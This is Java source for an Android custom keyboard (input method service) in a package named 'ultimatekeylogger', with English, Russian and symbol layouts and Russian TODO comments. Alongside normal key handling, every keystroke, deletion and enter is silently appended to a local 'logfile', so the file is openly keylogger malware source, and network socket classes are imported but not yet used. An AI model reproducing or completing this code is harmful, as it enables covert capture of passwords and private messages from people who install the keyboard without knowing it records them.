package com.sutd.ultimatekeylogger;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.AudioManager;
import android.os.AsyncTask;
import android.os.StrictMode;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.charset.Charset;
import java.util.List;

public class IME extends InputMethodService implements KeyboardView.OnKeyboardActionListener{

    private KeyboardView kv;
    private Keyboard keyboard;
    private String mCurrentLocale = "ENGLISH";
    private String mPreviousLocale;
    private boolean isCapsOn = false;


    @Override
    public void onPress(int primaryCode) {
    }
    @Override
    public void onRelease(int primaryCode) {
    }
    //TODO: разобраться с записью кей-кодов
    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        InputConnection ic = getCurrentInputConnection();
        playClick(primaryCode);
        switch(primaryCode)
        {
            case Keyboard.KEYCODE_DELETE :
                ic.deleteSurroundingText(1, 0);
                break;
            case Keyboard.KEYCODE_SHIFT:
                isCapsOn = !isCapsOn;
                keyboard.setShifted(isCapsOn);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                break;
            case Keyboard.KEYCODE_MODE_CHANGE:
                handleLanguageSwitch();
                break;
            case -6:
                handleSymbolsSwitch();
                break;
            default:
                char code = (char)primaryCode;
                if(Character.isLetter(code) && isCapsOn){
                    code = Character.toUpperCase(code);
                }
                ic.commitText(String.valueOf(code),1);
        }
        try
        {
                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("logfile", MODE_APPEND), "UTF-8"));
                if(primaryCode == Keyboard.KEYCODE_DELETE) { bw.write("(DELETE)"); }
                else if(primaryCode == Keyboard.KEYCODE_DONE) { bw.write("(ENTER)");
                }
                else if(primaryCode != Keyboard.KEYCODE_MODE_CHANGE && primaryCode != Keyboard.KEYCODE_SHIFT && primaryCode != -6)
                {
                    if(isCapsOn) bw.write(Character.toUpperCase((char)primaryCode));
                    else bw.write((char)primaryCode);
                }
                bw.close();
        }
        catch (FileNotFoundException e) { e.printStackTrace(); }
        catch (IOException e) { e.printStackTrace(); }
    }
    @Override
    public void onText(CharSequence text) {
    }
    @Override
    public void swipeLeft() {
    }
    @Override
    public void swipeRight() {
    }
    @Override
    public void swipeDown() {
    }
    @Override
    public void swipeUp() {
    }

    @Override
    public View onCreateInputView() {
        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.layout.keys_definition_en);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        return kv;
    }

    private void playClick(int keyCode){
        AudioManager am = (AudioManager)getSystemService(AUDIO_SERVICE);
        switch(keyCode){
            case 32:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
                break;
            case Keyboard.KEYCODE_DONE:
            case 10:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
                break;
            case Keyboard.KEYCODE_DELETE:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
                break;
            default: am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
        }
    }
    private Keyboard getKeyboard(String locale) {
        switch (locale) {
            case "RUSSIAN":
                return new Keyboard(this, R.layout.keys_definition_ru);
            case "ENGLISH":
                return new Keyboard(this, R.layout.keys_definition_en);
            case "SYMBOLS":
                return new Keyboard(this, R.layout.keys_definition_symbols);
            default:
                return new Keyboard(this, R.layout.keys_definition_ru);
        }
    }
    //TODO: [ГОТОВО ]Разобраться с некорректным возвратом на язык после переключения на символы
    private void handleLanguageSwitch() {
        if (mCurrentLocale.equals("RUSSIAN")) {
            mCurrentLocale = "ENGLISH";
            mPreviousLocale = "RUSSIAN";
            keyboard = getKeyboard("ENGLISH");
        }
        else
         {
             mCurrentLocale = "RUSSIAN";
             mPreviousLocale = "ENGLISH";
             keyboard = getKeyboard("RUSSIAN");
        }

        kv.setKeyboard(keyboard);
        keyboard.setShifted(isCapsOn);
        kv.invalidateAllKeys();
    }
    private void handleSymbolsSwitch()
    {
        if (!mCurrentLocale.equals("SYMBOLS"))
        {
            keyboard = getKeyboard("SYMBOLS");
            mPreviousLocale = mCurrentLocale;
            mCurrentLocale = "SYMBOLS";
        }
        else
        {
            mCurrentLocale = mPreviousLocale;
            keyboard = getKeyboard(mPreviousLocale);
            keyboard.setShifted(isCapsOn);
        }
        kv.setKeyboard(keyboard);
        kv.invalidateAllKeys();

    }

    //TODO: заставить работать этот метод
    @Override
    public void onFinishInputView(boolean finishingInput)
    {
        try {
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("logfile", MODE_APPEND), "UTF-8"));
            bw.write("\n(KEYBOARD CLOSED)\n");
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

}